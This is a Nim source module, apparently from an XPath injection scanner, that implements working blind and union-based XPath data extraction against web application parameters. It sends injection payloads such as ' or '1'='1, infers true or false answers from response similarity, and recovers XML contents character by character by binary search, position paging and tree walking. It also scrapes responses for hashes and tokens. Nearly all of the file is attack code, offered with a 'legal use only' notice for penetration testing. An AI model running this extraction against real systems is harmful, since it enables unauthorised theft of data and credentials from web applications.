## XPath Injection Scanner - Advanced vulnerability detection tool.
## Coded by Chokri Hammedi (blue0x1).
## Licensed under the MIT License.
## Legal use only: use on systems you own or have explicit permission to test.

## Blind XPath data extractor.
## Supports A/B/C/Dq/Eq injection contexts.
## Extraction techniques:
##   1. Classic blind (substring + binary search) - char-by-char
##   2. Position pagination - enumerate record count, extract by position index
##   3. Node path traversal - probe depth then walk /*[i]/*[j]/... tree

import strutils, tables
import ../utils/config, ../utils/logger
import http, analyzer, payloads

const
  PRINTABLE_ASCII* = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
  COMMON_UTF8* = "áàâäãåāăąæçćčďđéèêëēėęíìîïīłñńóòôöõøōœŕřśšșßťțúùûüūýÿžźżÁÀÂÄÃÅĀĂĄÆÇĆČĎĐÉÈÊËĒĖĘÍÌÎÏĪŁÑŃÓÒÔÖÕØŌŒŔŘŚŠȘẞŤȚÚÙÛÜŪÝŸŽŹŻαβγδεζηθικλμνξοπρστυφχψωабвгдеёжзийклмнопрстуфхцчшщъыьэюяابتثجحخدذرزسشصضطظعغفقكلمنهوي"
  ALPHA_NUMERIC*   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-."

type
  ExtractContext* = object
    cfg*:          ScanConfig
    param*:        string
    queryParams*:  Table[string, string]
    trueBody*:     string
    falseBody*:    string
    reqCount*:     int
    condPrefix*:   string
    condSuffix*:   string
    blindReliable*: bool

  ExtractionResult* = object
    expr*:        string
    value*:       string
    nodeCount*:   int
    nodes*:       seq[(string, string)]
    reqCount*:    int


proc inject*(ctx: var ExtractContext, payload: string): HttpResponse =
  inc ctx.reqCount
  if ctx.cfg.httpMethod == hmPost:
    result = sendRequestWithRetry(ctx.cfg,
      bodyOverride = injectBody(ctx.cfg.data, ctx.param, payload, ctx.queryParams))
  else:
    result = sendRequestWithRetry(ctx.cfg,
      urlOverride = injectParam(ctx.cfg.url, ctx.param, payload, ctx.queryParams))

proc cond*(ctx: ExtractContext, condition: string): string =
  wrapCondition(ctx.condPrefix, ctx.condSuffix, condition)

proc isTrue*(ctx: var ExtractContext, payload: string): bool =
  let resp = ctx.inject(payload)
  if resp.err.len > 0: return false
  computeSimilarity(resp.body, ctx.trueBody).ratio >= 0.88


proc extractLength*(ctx: var ExtractContext, expr: string, maxLen = 512): int =
  var lo = 0
  var hi = maxLen
  while lo < hi:
    let mid = (lo + hi + 1) div 2
    if ctx.isTrue(ctx.cond("string-length(" & expr & ")>=" & $mid)):
      lo = mid
    else:
      hi = mid - 1
  result = lo

proc extractCount*(ctx: var ExtractContext, expr: string, maxN = 1000): int =
  var lo = 0
  var hi = maxN
  while lo < hi:
    let mid = (lo + hi + 1) div 2
    if ctx.isTrue(ctx.cond("count(" & expr & ")>=" & $mid)):
      lo = mid
    else:
      hi = mid - 1
  result = lo

proc xpathLiteral(value: string): string =
  if "'" notin value:
    return "'" & value & "'"
  if "\"" notin value:
    return "\"" & value & "\""
  result = "concat("
  let parts = value.split("'")
  for i in 0 ..< parts.len:
    if i > 0:
      result.add(", \"'\", ")
    result.add("'" & parts[i] & "'")
  result.add(")")

proc utf8Chars(s: string): seq[string] =
  var i = 0
  while i < s.len:
    let b = ord(s[i])
    var size =
      if b < 0x80: 1
      elif (b and 0xE0) == 0xC0: 2
      elif (b and 0xF0) == 0xE0: 3
      elif (b and 0xF8) == 0xF0: 4
      else: 1
    if i + size > s.len:
      size = 1
    result.add(s[i ..< i + size])
    i += size

proc charEquals(ctx: var ExtractContext, expr: string, pos: int,
                candidate: string): bool =
  ctx.isTrue(ctx.cond("substring(" & expr & "," & $pos & ",1)=" &
                      xpathLiteral(candidate)))

proc extractChar*(ctx: var ExtractContext, expr: string, pos: int,
                  charset = PRINTABLE_ASCII): string =
  var lo = 0
  var hi = charset.len - 1
  while lo < hi:
    let mid = (lo + hi + 1) div 2
    if ctx.isTrue(ctx.cond("substring(" & expr & "," & $pos & ",1)>=" &
                           xpathLiteral($charset[mid]))):
      lo = mid
    else:
      hi = mid - 1
  let candidate = $charset[lo]
  if ctx.charEquals(expr, pos, candidate):
    return candidate

  for ch in utf8Chars(COMMON_UTF8):
    if ctx.charEquals(expr, pos, ch):
      return ch

  result = ""

proc extractString*(ctx: var ExtractContext, expr: string,
                    maxLen = 256, charset = PRINTABLE_ASCII): string =
  let length = extractLength(ctx, expr, maxLen)
  if length == 0:
    debug("    String length = 0 for: " & expr)
    return ""
  debug("    String length = " & $length & " for: " & expr)
  var buf = ""
  for i in 1..length:
    let ch = extractChar(ctx, expr, i, charset)
    if ch.len == 0:
      debug("    Unknown char at pos " & $i & " - stopping")
      break
    buf.add(ch)
    stdout.write(ch)
    stdout.flushFile()
  echo ""
  result = buf


proc countByPosition*(ctx: var ExtractContext): int =
  if not ctx.isTrue(ctx.cond("position()>=1")): return 0
  var hi = 1
  while hi < 10000 and ctx.isTrue(ctx.cond("position()>=" & $hi)):
    hi *= 2
  var lo = hi div 2
  while lo < hi:
    let mid = (lo + hi + 1) div 2
    if ctx.isTrue(ctx.cond("position()>=" & $mid)): lo = mid
    else: hi = mid - 1
  result = lo

proc extractAtPosition*(ctx: var ExtractContext, pos: int, fieldExpr: string,
                        maxLen = 256): string =
  if not ctx.isTrue(ctx.cond("position()=" & $pos)): return ""

  var lo = 0; var hi = maxLen
  while lo < hi:
    let mid = (lo + hi + 1) div 2
    if ctx.isTrue(ctx.cond("position()=" & $pos &
                             " and string-length(" & fieldExpr & ")>=" & $mid)):
      lo = mid
    else:
      hi = mid - 1
  let length = lo
  if length == 0: return ""

  var buf = ""
  for i in 1..length:
    var clo = 0; var chi = PRINTABLE_ASCII.len - 1
    while clo < chi:
      let mid = (clo + chi + 1) div 2
      if ctx.isTrue(ctx.cond("position()=" & $pos &
                               " and substring(" & fieldExpr & "," & $i & ",1)>=" &
                               xpathLiteral($PRINTABLE_ASCII[mid]))):
        clo = mid
      else:
        chi = mid - 1
    let candidate = $PRINTABLE_ASCII[clo]
    if ctx.isTrue(ctx.cond("position()=" & $pos &
                             " and substring(" & fieldExpr & "," & $i & ",1)=" &
                             xpathLiteral(candidate))):
      buf.add(candidate)
      stdout.write(candidate)
      stdout.flushFile()
    else:
      var found = ""
      for ch in utf8Chars(COMMON_UTF8):
        if ctx.isTrue(ctx.cond("position()=" & $pos &
                               " and substring(" & fieldExpr & "," & $i & ",1)=" &
                               xpathLiteral(ch))):
          found = ch
          break
      if found.len == 0:
        break
      buf.add(found)
      stdout.write(found)
      stdout.flushFile()
  echo ""
  result = buf


proc probeXmlDepth*(ctx: var ExtractContext, startPath: string, maxDepth = 8): int =
  var path = startPath
  for d in 1..maxDepth:
    path = path & "/*[1]"
    if ctx.isTrue(ctx.cond("string-length(string(" & path & "))>0")):
      return d
  result = -1

proc extractNodePath*(ctx: var ExtractContext, path: string, maxLen = 256): string =
  if not ctx.isTrue(ctx.cond("string-length(string(" & path & "))>0")): return ""
  result = extractString(ctx, "string(" & path & ")", maxLen)

proc traverseXmlTree*(ctx: var ExtractContext, cfg: ScanConfig): ExtractionResult =
  result.expr = "/*"

  info("Probing XML document structure...")

  let extraDepth = probeXmlDepth(ctx, "/*[1]", 8)
  if extraDepth < 0:
    warn("Could not find leaf nodes in XML tree - structure may be too deep or injection not working")
    result.reqCount = ctx.reqCount
    return

  let totalDepth = 1 + extraDepth
  info("XML leaf depth from root: " & $totalDepth)

  var dsIdx = 1
  while dsIdx <= 50:
    let dsBase = "/*[1]/*[" & $dsIdx & "]"
    if not ctx.isTrue(ctx.cond("string-length(string(" & dsBase & "))>0")):
      break

    info("  Dataset [" & $dsIdx & "]: probing depth...")
    let dsExtra = probeXmlDepth(ctx, dsBase, 8)
    if dsExtra < 0:
      inc dsIdx; continue

    info("  Dataset [" & $dsIdx & "]: depth=" & $(1 + dsExtra) &
         " - extracting records...")

    var recIdx = 1
    while recIdx <= 10000:
      let recBase = dsBase & "/*[" & $recIdx & "]"
      if not ctx.isTrue(ctx.cond("string-length(string(" & recBase & "))>0")):
        break

      var fieldIdx = 1
      while fieldIdx <= 50:
        let fieldPath = recBase & "/*[" & $fieldIdx & "]"
        let val = extractNodePath(ctx, fieldPath, cfg.maxExtractLen)
        if val.len == 0: break

        let label = "ds[" & $dsIdx & "] rec[" & $recIdx & "] fld[" & $fieldIdx & "]"
        result.nodes.add((label, val))
        finding(label, val)
        inc fieldIdx

      inc recIdx
      result.nodeCount = result.nodes.len

    inc dsIdx

  result.reqCount = ctx.reqCount
  if result.nodes.len == 0:
    warn("Tree traversal found no data - try --xpath with a specific expression")


proc setupContext*(cfg: ScanConfig, param: string,
                   queryParams: Table[string, string],
                   confirmedTruePayload = ""): ExtractContext =
  result.cfg         = cfg
  result.param       = param
  result.queryParams = queryParams
  result.blindReliable = true

  let ctx = if confirmedTruePayload.len > 0: confirmedTruePayload
            else: "' or '1'='1"
  let (pfx, sfx) = inferInjectionContext(ctx)
  result.condPrefix = pfx
  result.condSuffix = sfx
  debug("Extractor context: prefix=[" & pfx & "] suffix=[" & sfx & "]")

  let truePayload  = wrapCondition(pfx, sfx, "true()")
  let falsePayload = wrapCondition(pfx, sfx, "false()")

  info("Establishing boolean baselines for extractor...")
  var resp: HttpResponse
  inc result.reqCount
  if cfg.httpMethod == hmPost:
    resp = sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, truePayload, queryParams))
  else:
    resp = sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, truePayload, queryParams))
  result.trueBody = resp.body

  inc result.reqCount
  if cfg.httpMethod == hmPost:
    resp = sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, falsePayload, queryParams))
  else:
    resp = sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, falsePayload, queryParams))
  result.falseBody = resp.body

  let sim = computeSimilarity(result.trueBody, result.falseBody)
  info("Baseline similarity (TRUE vs FALSE): " & sim.ratio.formatFloat(ffDecimal, 3))
  if sim.ratio > 0.97:
    result.blindReliable = false
    warn("TRUE and FALSE baselines are very similar - blind extraction may be unreliable")


proc dumpIndexedNodeSet(ctx: var ExtractContext,
                        er: var ExtractionResult,
                        nodeSet, labelPrefix: string,
                        cfg: ScanConfig,
                        maxItems = 20) =
  let total = extractCount(ctx, nodeSet, 200)
  if total <= 0:
    return

  info(labelPrefix & " nodes: " & $total)
  let limit = min(total, maxItems)
  for i in 1..limit:
    let item = "(" & nodeSet & ")[" & $i & "]"
    var label = labelPrefix & "[" & $i & "]"

    if labelPrefix == "attr":
      let attrName = extractString(ctx, "name(" & item & ")", 64, ALPHA_NUMERIC)
      if attrName.len > 0:
        label = "@" & attrName
    elif labelPrefix == "pi":
      let piName = extractString(ctx, "name(" & item & ")", 64, ALPHA_NUMERIC)
      if piName.len > 0:
        label = "pi:" & piName

    let value = extractString(ctx, "string(" & item & ")", cfg.maxExtractLen)
    if value.len > 0:
      er.nodes.add((label, value))
      er.nodeCount = er.nodes.len
      finding(label, value)

proc extractAuto*(ctx: var ExtractContext, cfg: ScanConfig): ExtractionResult =
  result.expr = "//*"

  if not ctx.blindReliable:
    warn("Skipping blind extraction because TRUE/FALSE responses are not distinct enough.")
    result.reqCount = ctx.reqCount
    return

  info("Counting result set using position()...")
  let posCount = countByPosition(ctx)
  info("Records in result set: " & $posCount)

  if posCount > 1000:
    warn("Skipping blind extraction because the inferred result set is too large.")
    result.reqCount = ctx.reqCount
    return

  if posCount > 0 and posCount <= 500:
    info("Extracting node names and values via //* index...")
    let nodeCount = extractCount(ctx, "//*", 500)
    result.nodeCount = nodeCount
    info("Total XML nodes: " & $nodeCount)

    let limit = min(nodeCount, 30)
    for i in 1..limit:
      let nameExpr  = "name((//*)[" & $i & "])"
      let valueExpr = "string((//*)[" & $i & "])"

      stdout.write("  Node[" & $i & "] name : ")
      stdout.flushFile()
      let name = extractString(ctx, nameExpr, 64, ALPHA_NUMERIC)

      stdout.write("  Node[" & $i & "] value: ")
      stdout.flushFile()
      let value = extractString(ctx, valueExpr, cfg.maxExtractLen)

      if name.len > 0 or value.len > 0:
        result.nodes.add((name, value))
        finding(name, value)

    dumpIndexedNodeSet(ctx, result, "//@*", "attr", cfg)
    dumpIndexedNodeSet(ctx, result, "//comment()", "comment", cfg)
    dumpIndexedNodeSet(ctx, result, "//processing-instruction()", "pi", cfg)

  else:
    info("Falling back to XML tree traversal...")
    let treeResult = traverseXmlTree(ctx, cfg)
    result.nodes    = treeResult.nodes
    result.nodeCount = treeResult.nodeCount

  result.reqCount = ctx.reqCount

proc extractExpression*(ctx: var ExtractContext, expr: string,
                        cfg: ScanConfig): string =
  info("Extracting: " & expr)
  stdout.write("  Value: ")
  stdout.flushFile()
  result = extractString(ctx, expr, cfg.maxExtractLen)
  if result.len == 0:
    warn("Empty result for expression: " & expr)


proc removeTagBlocks(s: string, tag: string): string =
  var outp = s
  let openNeedle = "<" & tag
  let closeNeedle = "</" & tag & ">"
  while true:
    let low = outp.toLowerAscii()
    let start = low.find(openNeedle)
    if start < 0:
      break
    let closeStart = low.find(closeNeedle, start)
    if closeStart < 0:
      break
    let closeEnd = closeStart + closeNeedle.len
    var next = ""
    if start > 0:
      next.add(outp[0 ..< start])
    next.add(' ')
    if closeEnd < outp.len:
      next.add(outp[closeEnd .. ^1])
    outp = next
  result = outp

proc stripTags(s: string): string =
  let clean = s.removeTagBlocks("script").removeTagBlocks("style")
  var inTag = false
  var textOut = ""
  var i = 0
  while i < clean.len:
    let ch = clean[i]
    case ch
    of '<':
      inTag = true
      let tail = clean[i .. ^1].toLowerAscii()
      if tail.startsWith("<br") or tail.startsWith("<tr") or
         tail.startsWith("</tr") or tail.startsWith("<td") or
         tail.startsWith("</td") or tail.startsWith("<th") or
         tail.startsWith("</th") or tail.startsWith("<p") or
         tail.startsWith("</p") or tail.startsWith("<li") or
         tail.startsWith("</li") or tail.startsWith("<div") or
         tail.startsWith("</div"):
        textOut.add('\n')
      else:
        textOut.add(' ')
    of '>':
      inTag = false
      textOut.add(' ')
    else:
      if not inTag:
        textOut.add(ch)
    inc i
  result = textOut
    .replace("&nbsp;", " ")
    .replace("&lt;", "<")
    .replace("&gt;", ">")
    .replace("&amp;", "&")
    .replace("&quot;", "\"")
    .replace("&#39;", "'")
    .replace("&#039;", "'")

proc isNoiseVisibleLine*(line: string): bool =
  let low = line.toLowerAscii().strip()
  if low.len == 0:
    return true
  if "internal server error" in low:
    return true
  if low.startsWith("xpath:") or low.startsWith("query:"):
    return true
  if "|//" in low or "|/*" in low or "|../" in low or "|@*" in low or
     "|ancestor-or-self" in low or "|processing-instruction" in low or
     "|comment()" in low:
    return true
  if ("{" in low and "}" in low) and
     ("font-family" in low or "border-collapse" in low or "padding" in low or
      "margin" in low or "width:" in low or "background" in low):
    return true
  if (";" in low and ":" in low) and
     ("font-family" in low or "border:" in low or "padding:" in low or
      "margin:" in low or "width:" in low):
    return true
  result = false

proc normalizedLines(s: string): seq[string] =
  let text = stripTags(s).replace("\r\n", "\n").replace("\r", "\n")
  for raw in text.splitLines():
    var line = raw.strip()
    while "  " in line:
      line = line.replace("  ", " ")
    if line.len > 0 and not isNoiseVisibleLine(line):
      result.add(line)

proc extractHtmlTableRowsDetailed*(body: string): seq[string]

proc visibleTextItems(body: string): seq[string] =
  result = extractHtmlTableRowsDetailed(body)
  if result.len == 0:
    result = normalizedLines(body)

proc uniqueVisibleItems(items: seq[string]): seq[string] =
  for item in items:
    if item.len > 0 and item notin result:
      result.add(item)

proc isHexToken(s: string): bool =
  if s.len < 32:
    return false
  for ch in s:
    if ch notin {'0'..'9', 'a'..'f', 'A'..'F'}:
      return false
  result = s.len in [32, 40, 64, 96, 128] or s.len >= 48

proc hasAlphaDigit(s: string): bool =
  var hasAlpha = false
  var hasDigit = false
  for ch in s:
    if ch in {'a'..'z', 'A'..'Z'}:
      hasAlpha = true
    elif ch in {'0'..'9'}:
      hasDigit = true
  result = hasAlpha and hasDigit

proc isCompactToken(s: string): bool =
  if s.len < 20 or s.len > 160 or not hasAlphaDigit(s):
    return false
  for ch in s:
    if ch in {' ', '\t', '\r', '\n'}:
      return false
  result = true

proc isBraceToken(s: string): bool =
  let openAt = s.find('{')
  let closeAt = s.rfind('}')
  result = openAt >= 0 and closeAt > openAt + 4 and s.len <= 200

proc cleanVisibleToken(s: string): string =
  result = s.strip(chars = {' ', '\t', '\r', '\n', '"', '\'', ',', ';', ':',
                            '(', ')', '[', ']', '<', '>'})

proc tokensFromLine(line: string): seq[string] =
  for raw in line.splitWhitespace():
    let token = cleanVisibleToken(raw)
    if token.len > 0:
      result.add(token)

proc interestingKind(line: string): string =
  if isBraceToken(line):
    return "brace"
  for token in tokensFromLine(line):
    if isBraceToken(token):
      return "brace"
    if isHexToken(token):
      return "hash"
    if isCompactToken(token):
      return "token"
  result = ""

proc interestingVisibleNodes(items: seq[string],
                             labelPrefix = "item",
                             maxContexts = 20,
                             maxSignals = 40): seq[(string, string)] =
  let uniqueItems = uniqueVisibleItems(items)
  var contexts: seq[string]
  var tokenCount = 0
  var hashCount = 0
  var signals = 0

  for wanted in ["brace", "hash", "token"]:
    if signals >= maxSignals:
      break

    for i, item in uniqueItems:
      if signals >= maxSignals:
        break

      let kind = interestingKind(item)
      if kind != wanted:
        continue

      if kind == "hash":
        inc hashCount
        result.add((labelPrefix & "-hash[" & $hashCount & "]", item))
      else:
        inc tokenCount
        result.add((labelPrefix & "-token[" & $tokenCount & "]", item))
      inc signals

      let lo = max(0, i - 3)
      let hi = min(uniqueItems.len - 1, i + 3)
      let context = uniqueItems[lo .. hi].join(" | ")
      if context notin contexts and contexts.len < maxContexts:
        contexts.add(context)
        result.add((labelPrefix & "-context[" & $contexts.len & "]", context))

proc newVisibleItems(baseline, injected: string): seq[string] =
  let baseLines = uniqueVisibleItems(visibleTextItems(baseline))
  for line in visibleTextItems(injected):
    if line notin baseLines and line notin result:
      result.add(line)

proc visibleDeltaNodes(baseline, injected, labelPrefix: string): seq[(string, string)] =
  let items = newVisibleItems(baseline, injected)
  result = interestingVisibleNodes(items, labelPrefix)

proc payloadLabel(selector, path: string): string =
  selector & "|" & path

proc appendVisibleItems(er: var ExtractionResult,
                        items: seq[string],
                        labelPrefix: string,
                        maxItems = 120) =
  let highlights = interestingVisibleNodes(items, labelPrefix)
  let chosen =
    if highlights.len > 0: highlights
    else:
      var limited: seq[(string, string)]
      let uniqueItems = uniqueVisibleItems(items)
      for i in 0 ..< min(uniqueItems.len, maxItems):
        limited.add((labelPrefix & "[" & $(i + 1) & "]", uniqueItems[i]))
      limited

  for node in chosen:
    er.nodes.add(node)
    er.nodeCount = er.nodes.len
    finding(node[0], node[1])

proc visibleDelta*(baseline, injected: string): string =
  let unique = newVisibleItems(baseline, injected)
  let highlights = interestingVisibleNodes(unique, "delta")
  if highlights.len > 0:
    var values: seq[string]
    for node in highlights:
      if node[1] notin values:
        values.add(node[1])
    return values.join(" | ")

  var filtered: seq[string]
  for line in unique:
    var item = line
    if item.toLowerAscii().startsWith("results:"):
      item = if item.len > 8: item[8..^1].strip() else: ""
    if isNoiseVisibleLine(item):
      continue
    if item.len > 0:
      filtered.add(item)

  if filtered.len > 0:
    result = filtered[0 ..< min(filtered.len, 120)].join(" | ")

proc compactVisibleText(s: string): string =
  for part in stripTags(s).splitWhitespace():
    if result.len > 0:
      result.add(' ')
    result.add(part)

proc extractHtmlRows(body: string): seq[string] =
  let low = body.toLowerAscii()
  var pos = 0
  while true:
    let start = low.find("<tr", pos)
    if start < 0:
      break
    let gt = low.find(">", start)
    if gt < 0:
      break
    let stop = low.find("</tr>", gt)
    if stop < 0:
      break
    let chunk = body[gt + 1 ..< stop]
    if "<th" in chunk.toLowerAscii():
      pos = stop + 5
      continue
    let text = compactVisibleText(chunk)
    if text.len > 0:
      result.add(text)
    pos = stop + 5

proc attrValue(tag, attr: string): string =
  let low = tag.toLowerAscii()
  let key = attr.toLowerAscii() & "="
  let p = low.find(key)
  if p < 0:
    return ""
  var i = p + key.len
  if i >= tag.len:
    return ""
  let quote = tag[i]
  if quote == '"' or quote == '\'':
    inc i
    let e = tag.find($quote, i)
    if e > i:
      return tag[i ..< e]
  else:
    var e = i
    while e < tag.len and tag[e] notin {' ', '\t', '\r', '\n', '>'}:
      inc e
    if e > i:
      return tag[i ..< e]

proc extractLinksFromRow(rowHtml: string): seq[string] =
  let low = rowHtml.toLowerAscii()
  var pos = 0
  while true:
    let a = low.find("<a", pos)
    if a < 0:
      break
    let gt = low.find(">", a)
    if gt < 0:
      break
    let tag = rowHtml[a .. gt]
    let href = attrValue(tag, "href")
    if href.len > 0:
      result.add(href.replace("&amp;", "&"))
    pos = gt + 1

proc extractHtmlTableRowsDetailed*(body: string): seq[string] =
  let low = body.toLowerAscii()
  var pos = 0
  while true:
    let start = low.find("<tr", pos)
    if start < 0:
      break
    let gt = low.find(">", start)
    if gt < 0:
      break
    let stop = low.find("</tr>", gt)
    if stop < 0:
      break
    let rowHtml = body[gt + 1 ..< stop]
    if "<th" in rowHtml.toLowerAscii():
      pos = stop + 5
      continue
    var text = compactVisibleText(rowHtml)
    for href in extractLinksFromRow(rowHtml):
      if href notin text:
        if text.len > 0:
          text.add(" ")
        text.add(href)
    if text.len > 0:
      result.add(text)
    pos = stop + 5

proc extractVisibleHtmlResponse*(body: string, labelPrefix = "row"): ExtractionResult =
  result.expr = "visible html response"
  let items = visibleTextItems(body)
  if "internal server error" in body.toLowerAscii():
    return
  appendVisibleItems(result, items, labelPrefix)

proc extractNewVisibleHtmlResponses*(baseline: string,
                                     bodies: seq[string],
                                     labelPrefix = "row"): ExtractionResult =
  result.expr = "new visible html"

  var baselineItems = extractHtmlTableRowsDetailed(baseline)
  if baselineItems.len == 0:
    baselineItems = normalizedLines(baseline)

  var seen: seq[string]
  for item in baselineItems:
    if item notin seen:
      seen.add(item)

  for body in bodies:
    let lowBody = body.toLowerAscii()
    if body.len == 0 or "internal server error" in lowBody:
      continue

    var newItems: seq[string]
    for item in visibleTextItems(body):
      let low = item.toLowerAscii()
      if item.len == 0:
        continue
      if item in seen:
        continue
      if "internal server error" in low:
        continue

      seen.add(item)
      newItems.add(item)

    appendVisibleItems(result, newItems, labelPrefix)

proc sendVisiblePayload(cfg: ScanConfig, param: string,
                        queryParams: Table[string, string],
                        payload: string,
                        reqCount: var int): HttpResponse =
  inc reqCount
  if cfg.httpMethod == hmPost:
    result = sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, payload, queryParams))
  else:
    result = sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, payload, queryParams))

proc extractVisiblePredicatePages*(cfg: ScanConfig, param: string,
                                   queryParams: Table[string, string],
                                   confirmedTruePayload: string,
                                   pageSize = 5,
                                   maxOffset = 500): ExtractionResult =
  result.expr = "visible predicate pages"
  let (pfx, sfx) = inferInjectionContext(confirmedTruePayload)
  var reqCount = 0
  var seen: seq[string]
  var emptyPages = 0

  info("Extracting visible result pages with position() thresholds...")
  var offset = 0
  while offset <= maxOffset and emptyPages < 2:
    let payload = wrapCondition(pfx, sfx, "position()>" & $offset)
    let resp = sendVisiblePayload(cfg, param, queryParams, payload, reqCount)
    if resp.err.len > 0:
      debug("Visible predicate request failed: " & resp.err)
      break

    var rows = extractHtmlRows(resp.body)
    if rows.len == 0:
      let text = compactVisibleText(resp.body)
      if text.len > 0:
        rows.add(text)

    var added = 0
    for row in rows:
      if row notin seen:
        seen.add(row)
        inc added
        let label = "row[" & $seen.len & "]"
        result.nodes.add((label, row))
        result.nodeCount = result.nodes.len
        finding(label, row)

    if added == 0:
      inc emptyPages
    else:
      emptyPages = 0

    offset += pageSize

  result.reqCount = reqCount
  if result.nodes.len == 0:
    warn("Visible predicate extraction found no rows.")

proc sendVisiblePath(cfg: ScanConfig, param: string,
                     queryParams: Table[string, string],
                     selector, path: string,
                     reqCount: var int): tuple[value: string, body: string] =
  let payload = selector & "|" & path
  inc reqCount
  let resp =
    if cfg.httpMethod == hmPost:
      sendRequestWithRetry(cfg,
        bodyOverride = injectBody(cfg.data, param, payload, queryParams))
    else:
      sendRequestWithRetry(cfg,
        urlOverride = injectParam(cfg.url, param, payload, queryParams))
  if resp.err.len > 0:
    debug("Visible path request failed for " & path & ": " & resp.err)
    return ("", "")
  result = ("", resp.body)

proc visibleBaseline(cfg: ScanConfig, param: string,
                     queryParams: Table[string, string],
                     selector: string,
                     reqCount: var int): HttpResponse =
  inc reqCount
  if cfg.httpMethod == hmPost:
    result = sendRequestWithRetry(cfg,
      bodyOverride = injectBody(cfg.data, param, selector, queryParams))
  else:
    result = sendRequestWithRetry(cfg,
      urlOverride = injectParam(cfg.url, param, selector, queryParams))

proc suppressedVisibleParams(queryParams: Table[string, string],
                             param: string): seq[Table[string, string]] =
  let falseValues = @[
    "__xpath_no_match__",
    "') and ('1'='2",
  ]
  for falseValue in falseValues:
    var params = queryParams
    var changed = false
    for k in queryParams.keys:
      if k != param:
        params[k] = falseValue
        changed = true
    if changed:
      result.add(params)

proc firstVisibleLeaf(cfg: ScanConfig, param: string,
                      queryParams: Table[string, string],
                      selector, basePath, baselineBody: string,
                      reqCount: var int,
                      maxDepth = 8): string =
  var path = basePath
  for _ in 0..<maxDepth:
    let (_, body) = sendVisiblePath(cfg, param, queryParams, selector, path, reqCount)
    if body.len > 0 and visibleDelta(baselineBody, body).len > 0:
      return path
    path &= "/*[1]"
  result = ""

proc walkVisibleTree(cfg: ScanConfig, param: string,
                     queryParams: Table[string, string],
                     selector, path, baselineBody: string,
                     er: var ExtractionResult,
                     reqCount: var int,
                     depth = 0,
                     maxDepth = 8,
                     maxSiblings = 100) =
  if depth > maxDepth:
    return

  let (_, body) = sendVisiblePath(cfg, param, queryParams, selector, path, reqCount)
  if body.len == 0:
    return

  let source = payloadLabel(selector, path)
  let nodes = visibleDeltaNodes(baselineBody, body, source)
  if nodes.len > 0:
    for node in nodes:
      er.nodes.add(node)
      er.nodeCount = er.nodes.len
      finding(node[0], node[1])
    return

  let val = visibleDelta(baselineBody, body)
  if val.len > 0:
    er.nodes.add((source, val))
    er.nodeCount = er.nodes.len
    finding(source, val)
    return

  for i in 1..maxSiblings:
    let childPath = path & "/*[" & $i & "]"
    if firstVisibleLeaf(cfg, param, queryParams, selector, childPath,
                        baselineBody, reqCount, maxDepth - depth).len == 0:
      break
    walkVisibleTree(cfg, param, queryParams, selector, childPath, baselineBody,
                    er, reqCount, depth + 1, maxDepth, maxSiblings)

proc extractVisibleNodeSelection*(cfg: ScanConfig, param: string,
                                  queryParams: Table[string, string],
                                  selectorOverride = "",
                                  seedPath = ""): ExtractionResult =
  result.expr = "visible: /*[1] traversal via " & param
  let selector =
    if selectorOverride.len > 0: selectorOverride
    elif param in queryParams and queryParams[param].len > 0: queryParams[param]
    else: "text()"

  info("Establishing visible baseline for node-selection extraction...")
  var reqCount = 0
  let baseline = visibleBaseline(cfg, param, queryParams, selector, reqCount)

  if baseline.err.len > 0:
    warn("Cannot establish visible extraction baseline: " & baseline.err)
    result.reqCount = reqCount
    return

  if seedPath.len > 0:
    info("Extracting confirmed visible path: " & seedPath)
    let (_, body) = sendVisiblePath(cfg, param, queryParams, selector, seedPath, reqCount)
    let source = payloadLabel(selector, seedPath)
    let nodes = visibleDeltaNodes(baseline.body, body, source)
    if nodes.len > 0:
      result.expr = seedPath
      for node in nodes:
        result.nodes.add(node)
        result.nodeCount = result.nodes.len
        finding(node[0], node[1])
      result.reqCount = reqCount
      return

    let val = visibleDelta(baseline.body, body)
    if val.len > 0:
      result.expr = seedPath
      result.nodes.add((source, val))
      result.nodeCount = result.nodes.len
      result.reqCount = reqCount
      finding(source, val)
      return

    for params in suppressedVisibleParams(queryParams, param):
      let supBaseline = visibleBaseline(cfg, param, params, selector, reqCount)
      if supBaseline.err.len > 0:
        continue
      let (_, supBody) = sendVisiblePath(cfg, param, params, selector, seedPath, reqCount)
      let source = payloadLabel(selector, seedPath)
      let supNodes = visibleDeltaNodes(supBaseline.body, supBody, source)
      if supNodes.len > 0:
        result.expr = seedPath
        for node in supNodes:
          result.nodes.add(node)
          result.nodeCount = result.nodes.len
          finding(node[0], node[1])
        result.reqCount = reqCount
        return
      let supVal = visibleDelta(supBaseline.body, supBody)
      if supVal.len > 0:
        result.expr = seedPath
        result.nodes.add((source, supVal))
        result.nodeCount = result.nodes.len
        result.reqCount = reqCount
        finding(source, supVal)
        return
    warn("Confirmed path did not produce visible data; falling back to tree walk")

  info("Walking XML tree with visible union payloads...")
  walkVisibleTree(cfg, param, queryParams, selector, "/*[1]", baseline.body,
                  result, reqCount, 0, 8, 100)

  result.reqCount = reqCount
  if result.nodes.len == 0:
    warn("Visible node-selection extraction found no data.")
